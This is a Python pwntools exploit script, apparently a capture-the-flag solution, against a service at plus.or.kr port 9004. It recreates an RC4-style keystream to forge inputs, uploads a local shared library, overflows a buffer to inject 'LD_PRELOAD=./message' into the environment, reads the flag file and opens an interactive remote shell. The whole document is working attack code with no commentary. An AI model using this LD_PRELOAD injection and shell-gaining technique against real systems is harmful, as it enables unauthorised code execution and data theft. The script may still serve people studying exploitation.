from pwn import *

port = 9004

state = "8204ee9e0a2c0d4eb8605141858e3861fcd44c39402180bb896912a8f8599cf0469d753417bfd28c7a37e470071c23c3c46ab642a23e1677b99bdf22923294bd4abe365fce5b47d7ecb57bb0b38d9a5d314f8b3da148f6971a74432453ea0c2e26d61563ab68ff02307dd3d071cbe0134db46edb494454a052fdb7ac8a935a5850ca7635cd2ad85ca3c2fb104586569629e8f49f0683ccc96401a6f38fbc952d1dafa7a9eb663b1418d95ec7e26d7ca408d1e1c599ed67aa2779ae0e6c0b91da62dd6f3f7f7ef709dc1bcfd5ba981fc157c8defab119e972fe3a812b6b03f1e5b2f96584e64bc6202f73258855f52811ef87adf20078333ca590050fe31ee7c0"

state_table = []
for i in range (256):
  state_table.append (int (state [2*i : 2*(i+1)], 16))

ciphertext = "6231aa85bdbf9ff38a020c75ac23abe482c5257aefbdc961"
cipherlen = len (ciphertext) / 2

ciphertext_table = []
for i in range (cipherlen):
  ciphertext_table.append (int (ciphertext [2*i : 2*(i+1)], 16))

planetext_table = [0] * cipherlen

v4 = 0
v5 = 0
for i in range (cipherlen):
  v5 = (v5 + 1) % 256
  v4 = (v4 + state_table [v5]) % 256
  state_table [v4], state_table [v5] = state_table [v5], state_table [v4]
  planetext_table [i] = ciphertext_table [i] ^ state_table [(state_table [v4] + state_table [v5]) % 256]

planetext = ""
for i in range (cipherlen):
  hexval = hex (planetext_table [i]) [2:]
  if (len (hexval) == 1):
    hexval = "0" + hexval
  planetext += hexval

f = open ("/home/ebmoon/system/hook.so", "r")
data = f.read ()
f.close()

p1 = remote ("plus.or.kr", port)
p2 = remote ("plus.or.kr", port)

print p1.recvuntil ("food?")
p1.sendline (planetext.decode ("hex"))
log.info ("Sended planetext")

ciphertext = ciphertext + "\0LD_PRELOAD=./message\0".encode ("hex")
cipherlen = len (ciphertext) / 2

state_table = []
for i in range (256):
  state_table.append (int (state [2*i : 2*(i+1)], 16))

ciphertext_table = []
for i in range (cipherlen):
  ciphertext_table.append (int (ciphertext [2*i : 2*(i+1)], 16))

planetext_table = [0] * cipherlen

v4 = 0
v5 = 0
for i in range (cipherlen):
  v5 = (v5 + 1) % 256
  v4 = (v4 + state_table [v5]) % 256
  state_table [v4], state_table [v5] = state_table [v5], state_table [v4]
  planetext_table [i] = ciphertext_table [i] ^ state_table [(state_table [v4] + state_table [v5]) % 256]

state_table = []
for i in range (256):
  state_table.append (int (state [2*i : 2*(i+1)], 16))

planetext = ""
for i in range (cipherlen):
  hexval = hex (planetext_table [i]) [2:]
  if (len (hexval) == 1):
    hexval = "0" + hexval
  planetext += hexval

null = '\0'
hook = planetext.decode ("hex") + null * (120 - len (planetext) / 2)
env = p64 (0x602139)

payload = hook + env * 40

print p1.recvuntil ("message")
p1.sendline (data)
p1.close ()

print p2.recvuntil ("food?")
p2.sendline (payload)
log.info ("Sended payload")

print p2.recvuntil ("message")
p2.sendline ("/bin/cat /bin/steak/flag")
log.info ("Sended message2")

p2.recv (timeout = 3)

p2.interactive ()

p2.recv (timeout = 3)
p2.close ()
